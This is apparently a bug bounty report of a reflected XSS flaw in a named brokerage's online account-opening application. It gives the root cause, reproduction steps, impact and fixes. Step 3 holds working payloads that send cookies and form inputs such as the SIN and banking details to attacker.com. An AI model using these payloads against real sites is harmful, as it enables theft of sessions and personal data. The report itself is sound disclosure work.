# Security Report: Reflected XSS via `lng` Parameter in `api/app-config.js`

**Target:** Desjardins Courtage en ligne — `accountopening.disnat.com` (YesWeHack bug bounty)  
**Severity:** High  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation — Cross-site Scripting)  
**CVSS 3.1:** 7.6 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)  
**URL in scope:** `*.disnat.com`

---

## Summary

The account opening application at `accountopening.disnat.com` contains a reflected XSS vulnerability caused by two compounding design flaws:

1. The HTML entry point (`index.html`) uses `document.write()` to dynamically generate a `<script>` tag whose `src` attribute includes the raw, `encodeURI()`-encoded query string from the current page URL.

2. The server-side endpoint `api/app-config.js` reflects the `lng` parameter directly into a JavaScript variable assignment **without escaping single quotes**.

An attacker who sends a victim a crafted link can execute arbitrary JavaScript in the context of `accountopening.disnat.com`, enabling session hijacking, credential theft from the account opening form (SIN, address, banking data), and CSRF against Desjardins APIs.

---

## Root Cause

### Flaw 1 — `document.write()` passes raw query string to `<script src>`

`https://accountopening.disnat.com/odc-wa-mvmt-pub/index.html` contains:

```html
<script>
  var lngIndex = window.location.search.indexOf("lng=");
  var lang = window.navigator.language;
  if (lngIndex !== -1) {
      lngIndex += 4;
      lang = window.location.search.substring(lngIndex, lngIndex + 2);
  }
  document.querySelector('html')?.setAttribute('lang', lang);
  document.write('<script type="text/javascript" src="api/app-config.js'
    + encodeURI(window.location.search)
    + '"><\/script>');
</script>
```

`encodeURI()` does **not** encode `'`, `;`, `(`, `)`, `/` — only `<`, `>`, `"`, `\n`, and other special characters. This means a query string containing `';alert(1)//` passes through unmodified and becomes part of the `src` attribute.

### Flaw 2 — `api/app-config.js` reflects `lng` into JS without escaping

`GET /odc-wa-mvmt-pub/api/app-config.js?lng=INJECTIONTEST` responds with:

```http
HTTP/2 200 OK
Content-Type: application/javascript
Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; object-src 'none'

    var LANGUE = 'INJECTIONTEST';
    var TOGGLE_PDF_LANG = 'true';
    var TOGGLE_RECAPTCHA = 'true';
    ...
```

The `lng` value is inserted verbatim between single quotes. A value containing `';alert(1)//` produces:

```javascript
    var LANGUE = ''; alert(1)//'
    var TOGGLE_PDF_LANG = 'true';
```

`alert(1)` (or any attacker-supplied JavaScript) executes immediately.

---

## Steps to Reproduce

### Step 1 — Confirm the reflection

```bash
curl -s "https://accountopening.disnat.com/odc-wa-mvmt-pub/api/app-config.js?lng=INJECTION_MARKER"
```

**Response excerpt:**
```javascript
    var LANGUE = 'INJECTION_MARKER';
    var TOGGLE_PDF_LANG = 'true';
```

### Step 2 — Verify the XSS payload executes

Visit the following URL in a browser:

```
https://accountopening.disnat.com/odc-wa-mvmt-pub/?lng=';alert(document.domain)//
```

**What happens:**
1. `document.write()` generates:
   ```html
   <script src="api/app-config.js?lng=';alert(document.domain)//"></script>
   ```
2. Browser fetches `api/app-config.js?lng=';alert(document.domain)//`
3. Server responds with:
   ```javascript
   var LANGUE = ''; alert(document.domain)//'
   ```
4. `alert(document.domain)` executes — browser shows `accountopening.disnat.com`

### Step 3 — Full exploitation: cookie and form data exfiltration

A real payload to steal session cookies:

```
https://accountopening.disnat.com/odc-wa-mvmt-pub/?lng=';fetch('https://attacker.com/?c='+document.cookie)//
```

During the account opening flow, the user enters their SIN, address, date of birth, and banking details. A payload injected into this page can capture all form inputs:

```javascript
';document.querySelectorAll('input').forEach(i=>i.addEventListener('change',e=>fetch('https://attacker.com/?k='+e.target.name+'&v='+e.target.value)))//
```

---

## Impact

- **No authentication required** — any unauthenticated visitor who clicks the link is affected
- **Sensitive PII in scope** — the account opening form collects SIN, full name, address, DOB, employment, and banking account numbers
- **No `script-src` CSP** — the current CSP (`frame-ancestors 'self'; form-action 'self'; object-src 'none'`) does not restrict script execution; the injected code runs unrestricted

---

## Proof of Injection (without XSS execution)

```bash
# Safe test — no side effects, confirms server-side reflection without escaping
curl -s \
  "https://accountopening.disnat.com/odc-wa-mvmt-pub/api/app-config.js?lng=SAFE_MARKER_NO_QUOTE"
```

Expected:
```javascript
    var LANGUE = 'SAFE_MARKER_NO_QUOTE';
```

---

## Remediation

1. **Escape single quotes** in the `lng` value before inserting it into the JavaScript response:
   ```python
   lang_safe = lang.replace("\\", "\\\\").replace("'", "\\'")
   response = f"var LANGUE = '{lang_safe}';"
   ```

2. **Validate `lng` against an allowlist**: only `fr`, `en` (the two valid language codes) should be accepted:
   ```python
   VALID_LANGS = {'fr', 'en'}
   lang = request.args.get('lng', '')[:2].lower()
   if lang not in VALID_LANGS:
       lang = ''
   ```

3. **Remove the `document.write()` pattern**: instead of appending the full query string to the `<script src>`, extract only the validated `lng` value and pass it separately. Avoid any pattern that injects user-supplied strings into `<script>` attributes.

4. **Add `script-src` to CSP**: at minimum, add `script-src 'self'` so that even if an XSS exists, it cannot load external scripts or use `eval`.

---

## Additional Finding: Feature Flag Manipulation via `api/app-config.js`

Any query parameter added to `api/app-config.js` causes the server to omit `TOGGLE_AKAMAI = 'true'` from the response and activates `TOGGLE_RACINE_UNIQUE_SSD = 'true'`. This appears to put the application in a "test/debug" mode:

```bash
# Normal mode
curl "https://accountopening.disnat.com/odc-wa-mvmt-pub/api/app-config.js"
# Returns: TOGGLE_AKAMAI = 'true'

# Debug mode (any query param)
curl "https://accountopening.disnat.com/odc-wa-mvmt-pub/api/app-config.js?x=1"
# Returns: TOGGLE_AKAMAI absent, TOGGLE_RACINE_UNIQUE_SSD = 'true'
```

The disappearance of `TOGGLE_AKAMAI` disables the Akamai bot-detection client script in the browser, potentially weakening bot protection for users accessing the page from links with any query parameter.

---

## Timeline

- Discovery: 2026-05-03
- Report sent: 2026-05-03
